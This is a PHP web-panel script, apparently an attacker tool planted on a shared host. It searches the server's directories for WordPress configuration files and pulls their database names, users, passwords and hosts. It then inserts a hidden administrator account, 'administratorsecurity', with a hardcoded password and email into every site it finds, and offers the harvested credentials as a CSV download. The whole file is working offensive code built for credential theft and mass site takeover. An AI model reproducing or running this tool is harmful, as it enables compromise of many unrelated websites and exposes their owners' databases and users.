<?php
error_reporting(1);
session_start();
header('Content-Type: text/html; charset=utf-8');

// Handle CSV export request
if (isset($_GET['export_csv']) && $_GET['export_csv'] === '1') {
    if (isset($_SESSION['export_data'])) {
        header('Content-Type: text/csv');
        header('Content-Disposition: attachment; filename="wp_sites_'.date('Y-m-d').'.csv"');
        
        $output = fopen('php://output', 'w');
        $firstRow = reset($_SESSION['export_data']);
        fputcsv($output, array_keys($firstRow));
        
        foreach ($_SESSION['export_data'] as $row) {
            fputcsv($output, $row);
        }
        fclose($output);
        exit;
    }
    die('No data available for export');
}

// Function to safely scan directories with automatic path search
function scanForWpConfig($directory, $automatic = false) {
    $results = [];
    
    if ($automatic) {
        // Split the path into components and search each parent directory
        $pathParts = explode('/', trim($directory, '/'));
        $currentPath = '';
        
        foreach ($pathParts as $part) {
            $currentPath .= '/' . $part;
            try {
                $iterator = new RecursiveDirectoryIterator($currentPath, RecursiveDirectoryIterator::SKIP_DOTS);
                $files = new RecursiveIteratorIterator($iterator);
                
foreach ($files as $file) {
    $filename = $file->getFilename();
    if ($filename === 'wp-config.php' || fnmatch('*Wordpress.txt', $filename)) {
        $results[] = $file->getPathname();
    }
}

            } catch (Exception $e) {
                // Silently handle errors
                continue;
            }
        }
    } else {
        // Original behavior - just scan the specified directory recursively
        try {
            $iterator = new RecursiveDirectoryIterator($directory, RecursiveDirectoryIterator::SKIP_DOTS);
            $files = new RecursiveIteratorIterator($iterator);
            
foreach ($files as $file) {
    $filename = $file->getFilename();
    if ($filename === 'wp-config.php' || fnmatch('*Wordpress.txt', $filename)) {
        $results[] = $file->getPathname();
    }
}
        } catch (Exception $e) {
            // Silently handle errors
        }
    }
    
    return array_unique($results); // Remove duplicates
}

// Function to extract DB credentials from wp-config.php
function extractDbCredentials($filePath) {
    $content = @file_get_contents($filePath);
    if (!$content) return false;

    $patterns = [
        'DB_NAME' => "/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/",
        'DB_USER' => "/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/",
        'DB_PASSWORD' => "/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/",
        'DB_HOST' => "/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/",
        'table_prefix' => "/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]\s*;/"
    ];

    $credentials = [];
    foreach ($patterns as $key => $pattern) {
        preg_match($pattern, $content, $matches);
        $credentials[$key] = $matches[1] ?? '';
    }

    return $credentials;
}

// Function to get site URLs from database
function getSiteUrls($credentials) {
    try {
        $db = new mysqli($credentials['DB_HOST'], $credentials['DB_USER'], $credentials['DB_PASSWORD'], $credentials['DB_NAME']);
        if ($db->connect_error) return false;

        $prefix = $credentials['table_prefix'] ?? 'wp_';
        
        // Get both siteurl and home options
        $result = $db->query("SELECT option_name, option_value FROM {$prefix}options WHERE option_name IN ('siteurl', 'home')");
        $urls = [];
        while ($result && $row = $result->fetch_assoc()) {
            $urls[$row['option_name']] = $row['option_value'];
        }
        
        return [
            'siteurl' => $urls['siteurl'] ?? 'Not found',
            'home' => $urls['home'] ?? 'Not found'
        ];
    } catch (Exception $e) {
        return false;
    }
}

// Function to check if a user exists in WordPress
function checkAdminUser($credentials, $username) {
    try {
        $db = new mysqli($credentials['DB_HOST'], $credentials['DB_USER'], $credentials['DB_PASSWORD'], $credentials['DB_NAME']);
        if ($db->connect_error) return false;

        $prefix = $credentials['table_prefix'] ?? 'wp_';
        $username = $db->real_escape_string($username);
        $result = $db->query("SELECT ID FROM {$prefix}users WHERE user_login = '$username'");
        
        return ($result && $result->num_rows > 0);
    } catch (Exception $e) {
        return false;
    }
}

// Function to add admin user to WordPress
function addAdminUser($credentials, $username, $password, $email) {
    try {
        // CORRECTED LINE - removed problematic characters
        $db = new mysqli(
            $credentials['DB_HOST'], 
            $credentials['DB_USER'], 
            $credentials['DB_PASSWORD'], 
            $credentials['DB_NAME']
        );
        
        if ($db->connect_error) {
            return false;
        }

        $prefix = $credentials['table_prefix'] ?? 'wp_';

        // Check if user already exists
        if (checkAdminUser($credentials, $username)) {
            return "User already exists";
        }


        // Generate password hash
        $hash = password_hash($password, PASSWORD_DEFAULT);
        $username = $db->real_escape_string($username);
        $email = $db->real_escape_string($email);
        $now = current_time('mysql');

        // Insert user
        $db->query("INSERT INTO {$prefix}users (user_login, user_pass, user_nicename, user_email, user_status, display_name, user_registered) 
                    VALUES ('$username', '$hash', '$username', '$email', 0, '$username', '$now')");
        
        $user_id = $db->insert_id;
        
        // Add admin capabilities
        $db->query("INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) 
                    VALUES ($user_id, '{$prefix}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')");
        
        $db->query("INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) 
                    VALUES ($user_id, '{$prefix}user_level', '10')");
        
        return "User added successfully";
    } catch (Exception $e) {
        return "Error adding user: " . $e->getMessage();
    }
}

// Helper function to get current time in MySQL format
function current_time($type = 'mysql') {
    return date('Y-m-d H:i:s');
}

// Get current working directory for default search path
$currentDirectory = getcwd();
$automaticSearch = isset($_GET['path']) && $_GET['path'] === 'True';

// Process form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    $searchPath = $_POST['search_path'] ?? $currentDirectory;
    $dbUser = $_POST['db_user'] ?? '';
    $dbPass = $_POST['db_pass'] ?? '';
    $addUsername = $_POST['add_username'] ?? 'administratorsecurity';
    $addPassword = $_POST['add_password'] ?? '123456789@@123456789';
    $addEmail = $_POST['add_email'] ?? 'morocco2024@protonmail.com';
    
    if ($action === 'scan') {
        $configFiles = scanForWpConfig($searchPath, $automaticSearch);
        $results = [];
        
        foreach ($configFiles as $file) {
            $credentials = extractDbCredentials($file);
            if (!$credentials) continue;
            
            // If custom DB credentials provided, override the ones from config
            if (!empty($dbUser)) $credentials['DB_USER'] = $dbUser;
            if (!empty($dbPass)) $credentials['DB_PASSWORD'] = $dbPass;
            
            $siteUrls = getSiteUrls($credentials);
            $siteUrl = $siteUrls ? $siteUrls['siteurl'] : 'Could not connect';
            $homeUrl = $siteUrls ? $siteUrls['home'] : 'Could not connect';
            
            $result = [
                'site_url' => $siteUrl,
                'home_url'=> $homeUrl,
                'db_name' => $credentials['DB_NAME'],
                'db_user' => $credentials['DB_USER'],
                'db_pass' => $credentials['DB_PASSWORD'],
                'db_host' => $credentials['DB_HOST'],
                'table_prefix' => $credentials['table_prefix'] ?? 'wp_',
                'file_path' => $file,
                'admin_user' => '',
                'admin_pass' => '',
                'admin_email' => '',
                'user_status' => ''
            ];
            
            // If we're adding a user
            if (!empty($addUsername) && !empty($addPassword) && !empty($addEmail) && $siteUrls) {
                $userStatus = addAdminUser($credentials, $addUsername, $addPassword, $addEmail);
                $result['admin_user'] = $addUsername;
                $result['admin_pass'] = $addPassword;
                $result['admin_email'] = $addEmail;
                $result['user_status'] = $userStatus;
            }
            
            $results[] = $result;
        }
        
        // Store results in session for CSV export
        $_SESSION['export_data'] = $results;
        
        echo json_encode(['success' => true, 'results' => $results]);
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WordPress Config Scanner</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.datatables.net/1.13.6/css/dataTables.bootstrap5.min.css" rel="stylesheet">
    <style>
        .container { max-width: 1200px; margin-top: 30px; }
        .card { margin-bottom: 20px; }
        #resultsTable_wrapper { margin-top: 20px; }
        .loading { display: none; text-align: center; padding: 20px; }
        .btn-export { margin-left: 10px; }
        .search-mode { margin-bottom: 15px; font-weight: bold; }
        .path-list { margin-top: 5px; font-size: 0.9em; }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="mb-4">WordPress Config Scanner</h1>
        
        <div class="search-mode">
            Current search mode: <span class="badge bg-<?php echo $automaticSearch ? 'success' : 'primary'; ?>">
                <?php echo $automaticSearch ? 'Automatic' : 'Normal'; ?>
            </span>
<?php if ($automaticSearch): ?>
    <a href="<?php echo str_replace('&automatic=True', '', $_SERVER['REQUEST_URI']); ?>" class="btn btn-sm btn-outline-secondary ms-2">Switch to Normal Mode</a>
<?php else: ?>
    <a href="<?php echo $_SERVER['REQUEST_URI'] . (strpos($_SERVER['REQUEST_URI'], '?') === false ? '?' : '&') . 'automatic=True'; ?>" class="btn btn-sm btn-outline-success ms-2">Switch to Automatic Mode</a>
<?php endif; ?>
            <?php if ($automaticSearch): ?>
                <div class="path-list text-muted">
                    <strong>Searching in:</strong> 
                    <?php 
                    $pathParts = explode('/', trim($currentDirectory, '/'));
                    $currentPath = '';
                    foreach ($pathParts as $part) {
                        $currentPath .= '/' . $part;
                        echo '<div>' . htmlspecialchars($currentPath) . '</div>';
                    }
                    ?>
                </div>
            <?php endif; ?>
        </div>
        
        <div class="card">
            <div class="card-header">
                <h5 class="mb-0">Scan Configuration</h5>
            </div>
            <div class="card-body">
                <form id="scanForm">
                    <div class="row mb-3">
                        <label for="search_path" class="col-sm-2 col-form-label">Search Path:</label>
                        <div class="col-sm-10">
                            <input type="text" class="form-control" id="search_path" name="search_path" value="<?php echo htmlspecialchars($currentDirectory); ?>" required>
                            <small class="text-muted"><?php echo $automaticSearch ? 'In automatic mode, will search in all parent directories' : 'Will search recursively in this directory'; ?></small>
                        </div>
                    </div>
                    
                    <div class="row mb-3">
                        <label class="col-sm-2 col-form-label">DB Override:</label>
                        <div class="col-sm-5">
                            <input type="text" class="form-control" id="db_user" name="db_user" placeholder="DB Username (optional)">
                        </div>
                        <div class="col-sm-5">
                            <input type="password" class="form-control" id="db_pass" name="db_pass" placeholder="DB Password (optional)">
                        </div>
                    </div>
                    
                    <div class="row mb-3">
                        <label class="col-sm-2 col-form-label">Add Admin:</label>
                        <div class="col-sm-3">
                            <input type="text" class="form-control" id="add_username" name="add_username" placeholder="Username" value="administratorsecurity">
                        </div>
                        <div class="col-sm-3">
                            <input type="password" class="form-control" id="add_password" name="add_password" placeholder="Password" value="123456789@@123456789">
                        </div>
                        <div class="col-sm-4">
                            <input type="email" class="form-control" id="add_email" name="add_email" placeholder="Email" value="morocco2024@protonmail.com">
                        </div>
                    </div>
                    
                    <div class="row">
                        <div class="col-sm-10 offset-sm-2">
                            <button type="submit" class="btn btn-primary">Scan WordPress Sites</button>
                            <button type="button" id="exportBtn" class="btn btn-success btn-export" disabled>Export to CSV</button>
                        </div>
                    </div>
                </form>
            </div>
        </div>
        
        <div class="loading" id="loadingIndicator">
            <div class="spinner-border text-primary" role="status">
                <span class="visually-hidden">Loading...</span>
            </div>
            <p class="mt-2">Scanning for WordPress installations...</p>
        </div>
        
        <div class="table-responsive">
            <table id="resultsTable" class="table table-striped table-bordered" style="width:100%">
                <thead>
                    <tr>
                        <th>Site URL</th>
                        <th>Home URL</th>
                        <th>DB Name</th>
                        <th>DB User</th>
                        <th>DB Pass</th>
                        <th>DB Host</th>
                        <th>Table Prefix</th>
                        <th>Config Path</th>
                        <th>Added User</th>
                        <th>Added Pass</th>
                        <th>Added Email</th>
                        <th>Status</th>
                    </tr>
                </thead>
                <tbody></tbody>
            </table>
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.datatables.net/1.13.6/js/jquery.dataTables.min.js"></script>
    <script src="https://cdn.datatables.net/1.13.6/js/dataTables.bootstrap5.min.js"></script>
    
    <script>
        $(document).ready(function() {
            let dataTable = $('#resultsTable').DataTable({
                columns: [
                    { data: 'site_url' },
                    { data: 'home_url' },
                    { data: 'db_name' },
                    { data:'db_user' },
                    { data: 'db_pass' },
                    { data: 'db_host' },
                    { data: 'table_prefix' },
                    { data: 'file_path' },
                    { data: 'admin_user' },
                    { data: 'admin_pass' },
                    { data: 'admin_email' },
                    { data: 'user_status' }
                ],
                pageLength: 10,
                responsive: true,
                dom: '<"top"lf>rt<"bottom"ip>'
            });
            
            $('#scanForm').on('submit', function(e) {
                e.preventDefault();
                $('#loadingIndicator').show();
                dataTable.clear().draw();
                $('#exportBtn').prop('disabled', true);
                
                let formData = $(this).serializeArray();
                formData.push({name: 'action', value: 'scan'});
                
                $.ajax({
                    url: window.location.href,
                    type: 'POST',
                    data: $.param(formData),
                    dataType: 'json',
                    success: function(response) {
                        if (response.success && response.results.length > 0) {
                            dataTable.rows.add(response.results).draw();
                            $('#exportBtn').prop('disabled', false);
                        } else {
                            alert('No WordPress installations found or an error occurred.');
                        }
                    },
                    error: function() {
                        alert('An error occurred during the scan.');
                    },
                    complete: function() {
                        $('#loadingIndicator').hide();
                    }
                });
            });
            
            $('#exportBtn').on('click', function() {
                if (!$(this).prop('disabled')) {
                    window.location.href = window.location.href + '?&export_csv=1';
  //                  window.location.href = window.location.href  + '&export_csv=1';
                }
            });
        });
    </script>
</body>
</html>
